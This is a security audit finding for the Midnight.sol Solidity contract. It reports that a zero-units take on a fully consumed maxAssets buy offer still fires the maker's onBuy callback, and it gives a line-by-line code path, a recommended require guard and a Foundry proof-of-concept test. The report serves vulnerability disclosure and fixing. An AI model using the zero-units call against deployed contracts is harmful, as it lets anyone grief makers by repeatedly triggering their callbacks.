### Title
Zero-units take on fully-consumed buy offer (maxAssets mode) triggers maker callback — (`src/Midnight.sol`)

### Summary
When a buy offer has `maxAssets > 0` and `consumed[maker][group]` already equals `offer.maxAssets`, a taker can call `take` with `units = 0`. Because `buyerAssets = 0 * buyerPrice / WAD = 0`, the consumed accounting adds zero and the `newConsumed <= offer.maxAssets` check passes. Execution continues unconditionally to the callback dispatch block, firing the maker's `onBuy` callback with `(buyerAssets=0, units=0, pendingFeeIncrease=0)` on an exhausted offer.

### Finding Description

**Exact code path** (`src/Midnight.sol`):

1. Precondition: `offer.buy = true`, `offer.maxAssets > 0`, `consumed[offer.maker][offer.group] == offer.maxAssets`, `offer.callback != address(0)`.
2. Attacker calls `take(offer, ratifierData, units=0, taker, receiver, takerCallback, takerCallbackData)`.
3. **Line 363**: `buyerAssets = uint256(0).mulDivDown(buyerPrice, WAD) = 0`.
4. **Line 364**: `sellerAssets = 0`.
5. **Line 367–369**: `offer.maxAssets > 0` branch taken. `newConsumed = consumed[maker][group] += 0` → `newConsumed` remains `== offer.maxAssets`. `require(maxAssets <= maxAssets)` **passes**.
6. **Lines 382–418**: All deltas (`buyerCreditIncrease`, `sellerCreditDecrease`, `sellerDebtIncrease`, `buyerPendingFeeIncrease`, `sellerPendingFeeDecrease`) are zero. No position or market state changes.
7. **Line 420**: `buyerCallback = offer.callback` (the maker's registered callback).
8. **Line 445**: `if (buyerCallback != address(0))` — no guard on `units > 0` or `buyerAssets > 0`.
9. **Line 449**: `IBuyCallback(buyerCallback).onBuy(id, market, 0, 0, 0, buyer, callbackData)` — **maker callback fires on exhausted offer**.
10. **Lines 455–456**: `safeTransferFrom(..., 0)` — zero-amount transfers succeed silently.

The `ConsumedAssets` guard at line 369 only prevents `newConsumed > maxAssets`; it does not prevent a no-op increment (adding zero) from passing when the offer is already at its cap. There is no `require(units > 0)` or `require(buyerAssets > 0)` guard anywhere before the callback dispatch.

The Certora spec `fullyConsumedOfferRevertsOnNonTrivialTake` (Consume.spec lines 99–111) covers only the `maxAssets == 0` (units-mode) path; there is no equivalent rule for the `maxAssets > 0` (assets-mode) path, leaving this gap unverified. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
The maker's `onBuy` callback executes on an offer that has been fully consumed. Any callback logic that does not explicitly guard against `units == 0` or `buyerAssets == 0` — such as pulling collateral, updating external state, interacting with other protocols, or emitting accounting events — will execute with stale/zero parameters. This violates the invariant that consumed offers cannot be filled and allows an unprivileged taker to grief the maker by repeatedly invoking their callback at zero cost (no token transfer required, no position change). [4](#0-3) [5](#0-4) 

### Likelihood Explanation
Preconditions are: (1) a buy offer with `maxAssets > 0` exists, (2) it has been fully consumed, (3) the maker registered a non-zero `offer.callback`. All three are normal operating conditions for any maker using the callback mechanism. The attack requires no special privilege, no capital, and no price manipulation — just calling `take` with `units = 0`. It is trivially repeatable on every block until the offer expires or the maker cancels it via `setConsumed`. [6](#0-5) 

### Recommendation
Add a guard at the top of the consumed-accounting block (or immediately before callback dispatch) that short-circuits when the effective fill is zero:

```solidity
// In the maxAssets branch, after computing buyerAssets/sellerAssets:
if (offer.maxAssets > 0) {
    uint256 delta = offer.buy ? buyerAssets : sellerAssets;
    require(delta > 0 || offer.maxAssets == 0, ZeroFill()); // or simply require(units > 0)
    newConsumed = consumed[offer.maker][offer.group] += delta;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

Alternatively, add a top-level `require(units > 0)` before any accounting, consistent with the existing behavior for the units-mode path where `units = 0` is a no-op that still passes but produces no state change. The fix should also be reflected in a new Certora rule mirroring `fullyConsumedOfferRevertsOnNonTrivialTake` for the `maxAssets > 0` case. [1](#0-0) [7](#0-6) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {IMidnight, Offer} from "src/interfaces/IMidnight.sol";
import {IBuyCallback} from "src/interfaces/ICallbacks.sol";

contract CallbackRecorder is IBuyCallback {
    uint256 public callCount;
    uint256 public lastUnits;
    uint256 public lastBuyerAssets;

    function onBuy(bytes32, Market memory, uint256 buyerAssets, uint256 units, uint256, address, bytes memory)
        external returns (bytes32)
    {
        callCount++;
        lastUnits = units;
        lastBuyerAssets = buyerAssets;
        return CALLBACK_SUCCESS;
    }
}

contract ZeroUnitsBypassTest is Test {
    // Setup: standard Midnight test harness (market, lender offer, etc.)
    // ...

    function testZeroUnitsCallbackOnExhaustedBuyOffer() public {
        // 1. Configure a buy offer (lender is maker) with maxAssets = N, callback = recorder
        CallbackRecorder recorder = new CallbackRecorder();
        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 100e18;
        lenderOffer.buy = true;
        lenderOffer.callback = address(recorder);

        // 2. Fully consume the offer
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);

        // 3. Attacker calls take with units=0
        vm.prank(borrower); // unprivileged taker
        midnight.take(lenderOffer, hex"", 0, borrower, borrower, address(0), hex"");

        // 4. Assert: callback fired with zero amounts on exhausted offer
        assertEq(recorder.callCount(), 1,        "callback must have fired");
        assertEq(recorder.lastUnits(), 0,         "units passed to callback is 0");
        assertEq(recorder.lastBuyerAssets(), 0,   "buyerAssets passed to callback is 0");

        // 5. Assert: consumed unchanged, no position state change
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets, "consumed unchanged");
        assertEq(midnight.creditOf(id, lender), 0,  "no credit change");
        assertEq(midnight.debtOf(id, borrower), 0,  "no debt change");

        // 6. Repeatability: call again, callback fires a second time
        vm.prank(borrower);
        midnight.take(lenderOffer, hex"", 0, borrower, borrower, address(0), hex"");
        assertEq(recorder.callCount(), 2, "callback fires again — offer reused");
    }
}
```

Expected result: all assertions pass, demonstrating that the maker's `onBuy` callback fires (and can be fired repeatedly) on a fully exhausted buy offer with `maxAssets > 0`, with `units=0` and `buyerAssets=0` delivered to the callback. [8](#0-7) [2](#0-1) [9](#0-8)

```text
/// A fully-consumed offer in units mode only allows no-op takes.
rule fullyConsumedOfferRevertsOnNonTrivialTake(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiver, address takerCallback, bytes takerCallbackData) {
    require offer.maxAssets == 0;

    uint256 consumedBefore = consumed(offer.maker, offer.group);

    require offer.maxUnits > 0 && consumedBefore >= offer.maxUnits, "assume the offer is fully consumed";

    take(e, offer, ratifierData, units, taker, receiver, takerCallback, takerCallbackData);

    // If take does not revert, its input has to be zero.
    assert units == 0;
}
```
